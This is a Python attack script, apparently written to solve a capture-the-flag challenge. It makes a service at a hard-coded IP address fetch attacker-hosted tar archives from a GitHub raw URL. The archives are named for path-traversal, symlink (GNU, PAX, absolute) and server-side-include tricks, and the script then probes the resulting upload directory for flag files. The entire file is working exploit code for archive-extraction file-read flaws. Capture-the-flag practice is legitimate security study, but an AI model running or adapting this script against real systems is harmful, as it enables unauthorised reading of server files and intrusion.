#!/usr/bin/env python3
"""Test payloads using GitHub raw URLs."""
import requests
import time
import re

TARGET_URL = "http://89.144.35.159:1337/"
GITHUB_RAW_BASE = "https://raw.githubusercontent.com/alexandru-moga/explo/main/"

def test_github_payload(tar_file):
    """POST a GitHub raw URL to the target and check for flag."""
    payload_url = f"{GITHUB_RAW_BASE}{tar_file}"
    print(f"\n[*] Testing: {tar_file}")
    print(f"    URL: {payload_url}")
    
    try:
        # POST the URL to the target
        response = requests.post(TARGET_URL, data={"url": payload_url}, timeout=30)
        
        # Extract the upload directory from response
        if "uploads/" in response.text:
            match = re.search(r'uploads/([a-f0-9]+)', response.text)
            if match:
                upload_dir = match.group(1)
                print(f"    Upload dir: uploads/{upload_dir}")
                
                # Try to fetch common filenames
                test_files = [
                    "flag", "getflag", "flag.shtml", 
                    "flag.txt", "flag_txt",
                    "flag_root", "flag_home_ctf", "var_www_flag"
                ]
                
                for filename in test_files:
                    try:
                        file_url = f"{TARGET_URL}uploads/{upload_dir}/{filename}"
                        file_resp = requests.get(file_url, timeout=5)
                        
                        if file_resp.status_code == 200:
                            content = file_resp.text
                            if "CTF{" in content or "FLAG{" in content or (len(content) > 5 and len(content) < 200):
                                print(f"\n{'='*60}")
                                print(f"[!] POTENTIAL FLAG at {filename}!")
                                print(f"{'='*60}")
                                print(f"URL: {file_url}")
                                print(f"Content:\n{content}")
                                print(f"{'='*60}\n")
                                return content
                    except:
                        pass
                
                print(f"    ✗ No accessible files found")
            else:
                print(f"    ✗ Could not extract upload directory")
        else:
            print(f"    ✗ No upload directory in response")
            
    except Exception as e:
        print(f"    ✗ Error: {e}")
    
    return None

def main():
    """Test all tar payloads from GitHub."""
    tar_files = [
        "traversal_simple.tar",
        "traversal_deep.tar", 
        "traversal_flag_txt.tar",
        "symlink_gnu.tar",
        "symlink_pax.tar",
        "ssi_payload.tar",
        "absolute_symlink.tar",
    ]
    
    print(f"Testing payloads from GitHub...")
    print(f"Target: {TARGET_URL}")
    print(f"GitHub base: {GITHUB_RAW_BASE}\n")
    
    for tar_file in tar_files:
        result = test_github_payload(tar_file)
        if result and ("CTF{" in result or "FLAG{" in result):
            print("\n[!] FLAG FOUND!")
            break
        time.sleep(1)
    
    print("\n[+] Testing complete")

if __name__ == "__main__":
    main()
